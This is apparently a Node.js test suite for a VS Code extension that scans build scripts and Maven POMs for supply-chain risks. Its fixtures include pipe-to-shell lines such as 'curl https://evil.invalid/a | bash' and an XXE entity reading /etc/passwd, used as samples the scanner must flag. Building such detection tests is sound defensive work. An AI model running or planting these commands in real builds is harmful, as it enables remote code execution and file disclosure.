const test=require('node:test');const assert=require('node:assert/strict');
const fs=require('node:fs/promises');const path=require('node:path');const os=require('node:os');const Module=require('node:module');
const {SECURITY_METHODS,BUILTIN_METHOD_IDS,validateMethodFlags,providerMethodDisabled}=require('../dist/methods/catalog');
const {scanProject}=require('../dist/scanner/repositoryScanner');
const {DEFAULT_SETTINGS,DEFAULT_ENFORCE_POLICY}=require('../dist/scanner/defaults');
const {analyzeMavenPom,supportedMavenPom}=require('../dist/scanner/mavenPomRules');
let setup;const env={trusted:true,project:'',picks:[],files:[],inputs:[]};
const vscode={workspace:{get isTrusted(){return env.trusted;},get workspaceFolders(){return [{uri:{scheme:'file',fsPath:env.project}}];}},window:{showQuickPick:async()=>env.picks.shift(),showOpenDialog:async()=>env.files.shift(),showInputBox:async()=>env.inputs.shift(),showWarningMessage:async()=>{}},commands:{executeCommand:async()=>{}}};
const original=Module._load;try {Module._load=function(id,...args){return id==='vscode'?vscode:original.call(this,id,...args);};setup=require('../dist/methods/setup');}finally{Module._load=original;}
// Wizard tests select a stand-in executable; interpreter isolation/readiness is covered by bootstrap.test.js.
require('../dist/methods/bootstrap').pythonVersion=async()=> '3.14.0';
require('../dist/methods/bootstrap').sdkSupportedRunners=async()=>['bandit','semgrep','psscriptanalyzer','trivy','osv','script-semantics'];
async function fixture(t,files){const dir=await fs.mkdtemp(path.join(os.tmpdir(),'wg-methods-'));const project=path.join(dir,'project');await fs.mkdir(project);for(const [file,text] of Object.entries(files)){await fs.mkdir(path.dirname(path.join(project,file)),{recursive:true});await fs.writeFile(path.join(project,file),text);}t.after(()=>fs.rm(dir,{recursive:true,force:true}));return{dir,project};}
test('catalog has independent built-in defaults and explicit user flags reject unknown methods',()=>{
 assert.equal(BUILTIN_METHOD_IDS.length,6);assert.ok(SECURITY_METHODS.filter(m=>m.category!=='BUILT_IN').every(m=>m.defaultEnabled===false));
 assert.equal(validateMethodFlags({'builtin.script-rules':false})['builtin.script-rules'],false);
 for(const value of [[],null,{'other.tool':true},{'builtin.script-rules':'false'}])assert.throws(()=>validateMethodFlags(value));
 assert.equal(providerMethodDisabled({'builtin.script-rules':false},'wrapperguard'),false);
 assert.equal(providerMethodDisabled({},'python.bandit'),false);assert.equal(providerMethodDisabled({'sast.bandit':false},'python.bandit'),true);
});
test('turning off one built-in removes only its checks and reports configured scope',async t=>{
 const {project}=await fixture(t,{'gradlew':'#!/bin/sh\ncurl https://evil.invalid/a | bash\n','build.gradle':'password = "secret"\n'});
 const report=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,methodFlags:{'builtin.script-rules':false}},[]);
 assert.ok(!report.findings.some(f=>f.ruleId.startsWith('WG-SCRIPT')));assert.ok(report.findings.some(f=>f.ruleId==='WG-BUILD-010'));
 assert.equal(report.complete,true);assert.ok(report.notices.some(n=>n.code==='WG-METHOD-DISABLED'));
});
test('turning off every built-in never yields clean zero-detector coverage',async t=>{
 const {project}=await fixture(t,{'gradlew':'#!/bin/sh\necho safe\n'});
 const report=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,methodFlags:Object.fromEntries(BUILTIN_METHOD_IDS.map(id=>[id,false]))},[]);
 assert.equal(report.complete,false);assert.equal(report.verdict,'INCOMPLETE');assert.ok(report.notices.some(n=>n.code==='WG-METHOD-NONE'));
});
test('graph flag removes edges while independent source checks remain active',async t=>{
 const {project}=await fixture(t,{'gradlew':'#!/bin/sh\nsh scripts/child.sh\n','scripts/child.sh':'curl https://evil.invalid/a | bash\n'});
 const report=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,methodFlags:{'builtin.script-graph':false}},[]);
 assert.equal(report.edges.length,0);assert.ok(report.findings.some(f=>f.ruleId==='WG-SCRIPT-001'));
});
test('Maven static rules ignore comments, validate XML and redact URL credentials',()=>{
 const source={relativePath:'pom.xml',content:'<project>\n<!-- <version>LATEST</version> -->\n<repositories><repository><url>http://user:secret@repo.invalid/releases</url></repository></repositories>\n<dependencies><dependency><version>1.2-SNAPSHOT</version></dependency></dependencies>\n</project>'};
 const findings=analyzeMavenPom(source,DEFAULT_SETTINGS);assert.deepEqual(findings.map(f=>f.ruleId),['WG-MAVEN-001','WG-MAVEN-003']);
 assert.equal(findings[0].location.line,3);assert.ok(!JSON.stringify(findings).includes('secret'));assert.ok(findings[0].evidence.redacted);
 assert.equal(supportedMavenPom({relativePath:'pom.xml',content:'<!DOCTYPE project [<!ENTITY x SYSTEM "file:///etc/passwd">]><project>&x;</project>'}),false);
 assert.equal(supportedMavenPom({relativePath:'pom.xml',content:'<project><a></project>'}),false);
 assert.equal(supportedMavenPom({relativePath:'pom.xml',content:'<settings/>'}),false);
});
test('Maven malformed and disabled scope are distinguished without running Maven',async t=>{
 const {project}=await fixture(t,{'pom.xml':'<project><broken></project>'});
 const report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);assert.equal(report.complete,false);assert.ok(report.notices.some(n=>n.code==='WG-MAVEN-UNSUPPORTED'));
 const disabled=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,methodFlags:{'builtin.maven-rules':false}},[]);assert.equal(disabled.complete,true);assert.ok(!disabled.notices.some(n=>n.code==='WG-MAVEN-UNSUPPORTED'));
});
test('profiles use SCAN-only warning requests and scope exact DAST targets',()=>{
 const bandit=SECURITY_METHODS.find(m=>m.id==='sast.bandit');const profile=setup.integrationProfile(bandit,{local:true,executable:'/opt/tools/bandit'});
 assert.deepEqual(profile.runner,{tool:'bandit',executable:'/opt/tools/bandit'});assert.deepEqual(profile.allowedOperations,['SCAN']);assert.deepEqual(profile.requestedActions,['WARNING']);
 assert.deepEqual(setup.targetScopeFromUrl('https://api.example.com/v1'),{origins:['https://api.example.com'],pathPrefixes:['/v1']});
 for(const url of ['https://a/../admin','https://a/%2fadmin','https://u:p@a','https://a?secret=1','file:///tmp/a'])assert.throws(()=>setup.targetScopeFromUrl(url));
});
test('AI endpoint is local only and current report excludes evidence, call chains and project root',()=>{
 for(const endpoint of ['http://127.0.0.1:1234/v1','http://[::1]:8000/v1/'])assert.doesNotThrow(()=>setup.validateLocalEndpoint(endpoint));
 for(const endpoint of ['https://remote.example/v1','http://localhost:1234/v1','http://127.0.0.1/v1','http://127.0.0.1:1234/admin','http://127.0.0.1:1234/v1?x=1'])assert.throws(()=>setup.validateLocalEndpoint(endpoint));
 const report={projectPath:'/private/project',findings:[{ruleId:'WG-X',title:'Review execution',severity:'WARN',category:'EXECUTION',location:{path:'a.py'},policyAction:'REVIEW',status:'ACTIVE',evidence:{text:'source-secret'},callChain:[{viaCommand:'secret command'}]},{status:'SUPPRESSED',evidence:{text:'ignored secret'}}]};
 const output=JSON.stringify(setup.minimizedAiInput(report));assert.ok(!output.includes('secret'));assert.ok(!output.includes('projectPath'));assert.equal(JSON.parse(output).findings.length,1);
});
test('connection wizard writes outside the workspace, respects cancellation and never runs a report producer',async t=>{
 const {dir,project}=await fixture(t,{});await fs.writeFile(path.join(dir,'report.json'),'{"runs":[]}');env.project=project;env.trusted=true;
 const managed=path.join(dir,'storage','integrations','providers.json');const method=SECURITY_METHODS.find(m=>m.id==='sast.sarif');
 env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(dir,'report.json')}]];
 assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},method,managed),true);
 const config=JSON.parse(await fs.readFile(managed,'utf8'));assert.equal(config.providers[0].id,'sast.sarif');assert.deepEqual(config.providers[0].permissions.actions,['WARNING']);assert.equal(config.providers[0].permissions.required,false);
 const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'sast.sarif.profile.json'),'utf8'));assert.deepEqual(profile.allowedOperations,['SCAN']);assert.ok(profile.reportPath.endsWith('report.json'));
 env.picks=[undefined];env.files=[];assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},method,managed),false);
 const inside=path.join(project,'python');await fs.symlink(process.execPath,inside);await assert.rejects(setup.validateExecutable(inside,[project]),/outside/);
 const externalPython=path.join(dir,'sdk-python');await fs.symlink(process.execPath,externalPython);assert.equal(await setup.validateExecutable(externalPython,[project]),externalPython);
 await fs.writeFile(path.join(project,'tool'),'#!/bin/sh\n',{mode:0o755});await assert.rejects(setup.validateExecutable(path.join(project,'tool'),[project]),/outside/);
});

test('local AI setup is a GUI connection with minimized evidence and no action grants',async t=>{
 const {dir,project}=await fixture(t,{'gradlew':'#!/bin/sh\necho safe\n'});env.project=project;env.trusted=true;
 env.picks=[{current:true},{responseFormat:'json_schema'},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}]];env.inputs=['http://127.0.0.1:1234/v1','local-model'];
 const managed=path.join(dir,'storage','integrations','providers.json');const method=SECURITY_METHODS.find(m=>m.id==='ai.external-model');
 const report={findings:[{ruleId:'WG-X',title:'Review execution',severity:'WARN',category:'EXECUTION',location:{path:'a.py'},status:'ACTIVE',policyAction:'REVIEW',evidence:{text:'raw-secret'}}]};
 assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},method,managed,report),true);
 const config=JSON.parse(await fs.readFile(managed,'utf8'));assert.deepEqual(config.providers[0].permissions.actions,[]);
 const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'ai.external-model.profile.json'),'utf8'));assert.equal(profile.analysisKind,'AI');assert.equal(profile.runner.tool,'local-ai');assert.equal(profile.runner.responseFormat,'json_schema');assert.deepEqual(profile.allowedOperations,['SCAN']);
 const input=await fs.readFile(profile.runner.inputReportPath,'utf8');assert.ok(!input.includes('raw-secret'));assert.ok(input.includes('Review execution'));
});
test('file and directory traversal caps report incomplete coverage, including canonical roots',async t=>{
 const {project}=await fixture(t,{'gradlew':'#!/bin/sh\necho safe\n','pom.xml':'<project/>','nested/deep/script.sh':'echo safe\n'});
 const capped=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,maxFilesPerScan:1},[]);
 assert.equal(capped.scannedFiles,1);assert.equal(capped.complete,false);assert.ok(capped.notices.some(n=>n.code==='WG-SCAN-LIMIT'&&n.message.startsWith('File count')));
 const depth=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,maxDirectoryDepth:1},[]);assert.equal(depth.complete,false);assert.ok(depth.notices.some(n=>n.code==='WG-SCAN-LIMIT'&&n.message.startsWith('Directory depth')));
});
test('Semgrep is an independent optional runner with bundled rules by default and SARIF fallback',()=>{
 const method=SECURITY_METHODS.find(m=>m.id==='sast.semgrep');assert.ok(method);assert.equal(method.defaultEnabled,false);
 const local=setup.integrationProfile(method,{local:true,executable:'/opt/semgrep'});assert.equal(local.format,'sarif');assert.deepEqual(local.runner,{tool:'semgrep',executable:'/opt/semgrep'});
 const imported=setup.integrationProfile(method,{reportPath:'/home/reports/semgrep.sarif'});assert.ok(!imported.runner);assert.equal(imported.format,'sarif');
});

test('current-scan AI input includes SDK-required message text without forwarding raw finding prose',()=>{
 const input=setup.minimizedAiInput({findings:[{ruleId:'WG-TEST',title:'Review execution',message:'password = "RAW_PRIVATE_VALUE"; /private/source/file.py',severity:'WARN',category:'EXECUTION',location:{path:'app.py',line:2},status:'ACTIVE',policyAction:'REVIEW',evidence:{text:'PRIVATE_SOURCE_SNIPPET'},callChain:[{viaCommand:'PRIVATE_COMMAND'}]}]});
 const finding=input.findings[0];assert.equal(typeof finding.message,'string');assert.ok(finding.message.length>0&&finding.message.length<=512);assert.equal(typeof finding.title,'string');assert.match(finding.ruleId,/^[A-Za-z0-9][A-Za-z0-9_.:/-]{0,199}$/);assert.ok(['INFO','WARN','ERROR'].includes(finding.severity));assert.equal(typeof finding.location.path,'string');
 const serialized=JSON.stringify(input);for(const privateValue of ['RAW_PRIVATE_VALUE','PRIVATE_SOURCE_SNIPPET','PRIVATE_COMMAND','/private/source'])assert.ok(!serialized.includes(privateValue));
});
test('unreadable project directories are reported as incomplete instead of silently clean',async t=>{
 const {project}=await fixture(t,{'gradlew':'#!/bin/sh\necho safe\n','restricted/hidden.sh':'curl https://private.invalid/install | bash\n'});const syncFs=require('node:fs');const original=syncFs.readdirSync;const restricted=await fs.realpath(path.join(project,'restricted'));
 let report;try{syncFs.readdirSync=function(file,...args){if(path.resolve(file)===restricted)throw Object.assign(new Error('PRIVATE_DIRECTORY_ERROR'),{code:'EACCES'});return original.call(this,file,...args);};report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);}finally{syncFs.readdirSync=original;}
 assert.equal(report.complete,false);assert.equal(report.verdict,'INCOMPLETE');assert.ok(report.notices.some(n=>n.code==='WG-FILE-READ'&&n.location?.path==='restricted'));assert.ok(!JSON.stringify(report).includes('PRIVATE_DIRECTORY_ERROR'));
});
test('canonical source and wrapper JAR symlinks do not read outside the selected project',async t=>{
 const {dir,project}=await fixture(t,{});const outside=path.join(dir,'outside.sh');await fs.writeFile(outside,'curl https://BOUNDARY_CANARY.invalid/install | bash\n');await fs.symlink(outside,path.join(project,'gradlew'));
 await fs.mkdir(path.join(project,'gradle/wrapper'),{recursive:true});await fs.symlink(outside,path.join(project,'gradle/wrapper/gradle-wrapper.jar'));
 const report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);assert.equal(report.complete,false);assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradlew'));assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradle/wrapper/gradle-wrapper.jar'));assert.ok(!report.findings.some(f=>f.ruleId==='WG-SCRIPT-001'||f.title.includes('SHA-256')));assert.ok(!JSON.stringify(report).includes('BOUNDARY_CANARY'));
});
test('contained links and linked directories are skipped while an explicitly selected project alias remains supported',async t=>{
 const {dir,project}=await fixture(t,{'content.data':'<project><version>LATEST</version></project>','gradlew':'#!/bin/sh\necho safe\n'});await fs.symlink(path.join(project,'content.data'),path.join(project,'pom.xml'));await fs.symlink(project,path.join(project,'nested-link'));
 const report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);assert.equal(report.complete,false);assert.ok(!report.findings.some(f=>f.ruleId==='WG-MAVEN-003'));assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='nested-link'));
 const alias=path.join(dir,'selected-alias');await fs.symlink(project,alias);const viaAlias=scanProject(alias,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);assert.deepEqual(viaAlias.findings.map(f=>f.fingerprint),report.findings.map(f=>f.fingerprint));
});
test('wrapper checksums respect the configured byte budget',async t=>{
 const {project}=await fixture(t,{'gradle/wrapper/gradle-wrapper.jar':'x'.repeat(32)});const report=scanProject(project,DEFAULT_ENFORCE_POLICY,{...DEFAULT_SETTINGS,maxFileBytes:16},[]);assert.equal(report.complete,false);assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradle/wrapper/gradle-wrapper.jar'));assert.ok(!report.findings.some(f=>f.title.includes('SHA-256')));
});
test('parent-directory links cannot expose wrapper metadata or recursively called source outside the project',async t=>{
 const {dir,project}=await fixture(t,{'gradlew':'#!/bin/sh\nsh linked/child.sh\n'});const outside=path.join(dir,'outside');await fs.mkdir(path.join(outside,'wrapper'),{recursive:true});await fs.writeFile(path.join(outside,'child.sh'),'curl https://PARENT_BOUNDARY_CANARY.invalid/x | bash\n');await fs.writeFile(path.join(outside,'wrapper/gradle-wrapper.properties'),'distributionUrl=https://PARENT_BOUNDARY_CANARY.invalid/distribution.zip\n');await fs.writeFile(path.join(outside,'wrapper/gradle-wrapper.jar'),'PARENT_BOUNDARY_CANARY');await fs.symlink(outside,path.join(project,'linked'));await fs.symlink(outside,path.join(project,'gradle'));
 const report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);assert.equal(report.complete,false);assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradlew'&&n.location?.line===2));assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradle/wrapper/gradle-wrapper.properties'));assert.ok(!JSON.stringify(report).includes('PARENT_BOUNDARY_CANARY'));assert.ok(!report.findings.some(f=>f.ruleId==='WG-SCRIPT-001'||f.title.includes('SHA-256')));
});

test('Semgrep bundled pack selection is explicit, removable and mutually exclusive with custom rules',()=>{
 const method=SECURITY_METHODS.find(item=>item.id==='sast.semgrep');const defaults=setup.SEMGREP_RULE_PACKS.filter(pack=>pack.defaultEnabled).map(pack=>pack.id);assert.deepEqual(defaults,['legacy-android-ktor']);
 const profile=setup.integrationProfile(method,{local:true,executable:'/opt/semgrep',rulePacks:['android-manifest','ktor-runtime']});assert.deepEqual(profile.runner.rulePacks,['android-manifest','ktor-runtime']);assert.equal(profile.runner.rulesPath,undefined);
 for(const source of [{rulePacks:[]},{rulePacks:['unknown']},{rulePacks:['jvm-crypto','jvm-crypto']},{rulePacks:['jvm-crypto'],rulesPath:'/opt/rules.yml'}])assert.throws(()=>setup.integrationProfile(method,{local:true,executable:'/opt/semgrep',...source}));
});
test('report import GUI rejects project-owned reports before persisting a connection',async t=>{
 const{dir,project}=await fixture(t,{'report.json':'{}'});env.project=project;env.trusted=true;env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(project,'report.json')}]];
 const managed=path.join(dir,'storage/integrations/providers.json');await assert.rejects(setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},SECURITY_METHODS.find(method=>method.id==='sast.sarif'),managed),/outside every workspace/);await assert.rejects(fs.readFile(managed),{code:'ENOENT'});
});
test('PowerShell module-folder selection resolves its manifest so gate input seals receive a regular file',async t=>{
 const{dir,project}=await fixture(t,{});env.project=project;env.trusted=true;const moduleDirectory=path.join(dir,'PSScriptAnalyzer');await fs.mkdir(moduleDirectory);await fs.writeFile(path.join(moduleDirectory,'PSScriptAnalyzer.psd1'),'@{}');
 env.picks=[{local:true},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:process.execPath}],[{fsPath:moduleDirectory}]];
 const managed=path.join(dir,'storage/integrations/providers.json');assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},SECURITY_METHODS.find(method=>method.id==='sast.powershell'),managed),true);
 const profile=JSON.parse(await fs.readFile(path.join(dir,'storage/integrations/sast.powershell.profile.json'),'utf8'));assert.equal(profile.runner.modulePath,await fs.realpath(path.join(moduleDirectory,'PSScriptAnalyzer.psd1')));assert.equal((await fs.stat(profile.runner.modulePath)).isFile(),true);
 const connection=JSON.parse(await fs.readFile(managed,'utf8')).providers[0];assert.ok(connection.inputScope.externalFiles.includes(profile.runner.modulePath));
});
